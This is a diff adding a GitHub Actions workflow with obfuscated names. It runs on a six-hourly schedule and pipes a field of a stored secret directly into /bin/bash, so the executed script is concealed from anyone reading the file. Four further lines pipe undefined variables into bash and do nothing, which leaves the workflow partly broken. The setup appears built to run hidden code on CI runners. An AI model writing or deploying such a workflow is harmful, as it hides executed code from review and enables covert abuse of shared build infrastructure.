@@ -1,0 +1,22 @@
+name: qianyifaerd
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianyifaerd
+        env:
+          pvts55: ${{ secrets.pvts55 }}
+        run: |
+          echo $pvts55 | jq -r .uf0582 | /bin/bash
+          echo $v8797 | jq -r .kgort34604 | /bin/bash
+          echo $ac147 | jq -r .v31 | /bin/bash
+          echo $sm970 | jq -r .mvq12 | /bin/bash
+          echo $secx5 | jq -r .cd96704 | /bin/bash
+
